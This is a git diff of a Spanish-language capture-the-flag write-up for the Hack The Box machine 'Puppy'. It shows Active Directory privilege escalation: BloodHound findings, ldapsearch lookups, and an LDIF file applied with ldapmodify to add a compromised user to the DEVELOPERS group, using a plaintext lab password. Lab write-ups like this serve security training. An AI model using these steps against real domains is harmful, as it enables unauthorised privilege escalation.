@@ -44,10 +44,15 @@ INFO: Querying computer: DC.PUPPY.HTB
 INFO: Done in 00M 11S
 INFO: Compressing output into 20250711060801_bloodhound.zip
 ```
-Si recordamos cuando enumeramos los directorios de smb uno de ellos nos decia que 
+Si recordamos cuando enumeramos los directorios de smb uno de ellos nos decia que era accesible por puppy devs
 
-<img width="1920" height="966" alt="image" src="https://github.com/user-attachments/assets/6ca36421-4f29-4e29-bc17-0f20ca53d21e" />
+<img width="678" height="297" alt="image" src="https://github.com/user-attachments/assets/e5fd618d-0942-42b6-999e-a8d0b849f8d8" />
 
+Desde Bloodhound podemos ver como tenemos permisos para modificar el grupo de devs, por lo tanto procederemos a añadirnos al grupo de devs.
+
+<img width="1002" height="135" alt="image" src="https://github.com/user-attachments/assets/b8601b89-0ed2-4b96-9c0c-529e275d9e49" />
+
+Ahora pasaremos a ejecutar el comando ldapsearch, esto con la finalidad de obtener el dn tanto del usuario del que tenemos credenciales como del grupo al que lo queremos añadir.
 
 ```bash
 └─# ldapsearch -x -H ldap://puppy.htb -D "puppy\\levi.james" -w 'KingofAkron2025!' -b "DC=puppy,DC=htb" "(sAMAccountName=levi.james)"
@@ -149,15 +154,16 @@ result: 0 Success
 # numEntries: 1
 # numReferences: 3
 ```
+Una vez obtenidos ambos dn procederemos a crear un archivo ldif que se encargue de añadir el usuario al grupo correspondiente
+
 ```bash
 dn: CN=DEVELOPERS,DC=PUPPY,DC=HTB
 changetype: modify
 add: member
 member: CN=Levi B. James,OU=MANPOWER,DC=PUPPY,DC=HTB
-
-└─# ldapmodify -x -H ldap://puppy.htb -D "puppy\\levi.james" -w 'KingofAkron2025!' -f mod.ldif
-modifying entry "CN=DEVELOPERS,DC=PUPPY,DC=HTB"
-
+```
+Ahora ejecutaremos el archivo ldif, y verificaremos que seamos miembros del grupo
+```bash
 └─# ldapsearch -x -H ldap://puppy.htb -D "puppy\\levi.james" -w 'KingofAkron2025!' -b "CN=DEVELOPERS,DC=PUPPY,DC=HTB" member
 # extended LDIF
 #
@@ -179,15 +185,12 @@ result: 0 Success
 
 # numResponses: 2
 # numEntries: 1
-                                                                                                                                                                                                                                           
-┌──(root㉿kali)-[~/THM/Puppy]
-└─# ldapmodify -x -H ldap://puppy.htb -D "puppy\\levi.james" -w 'KingofAkron2025!' -f mod.ldif                           
+```
+```bash
+└─# ldapmodify -x -H ldap://puppy.htb -D "puppy\\levi.james" -w 'KingofAkron2025!' -f mod.ldif
 modifying entry "CN=DEVELOPERS,DC=PUPPY,DC=HTB"
-
-                                                                                                                                                                                                                                           
-┌──(root㉿kali)-[~/THM/Puppy]
-└─# nano mod.ldif 
-                                                                                                                    
+```
+```bash                                                                                                             
 ┌──(root㉿kali)-[~/THM/Puppy]
 └─# ldapsearch -x -H ldap://puppy.htb -D "puppy\\levi.james" -w 'KingofAkron2025!' -b "CN=DEVELOPERS,DC=PUPPY,DC=HTB
 # extended LDIF
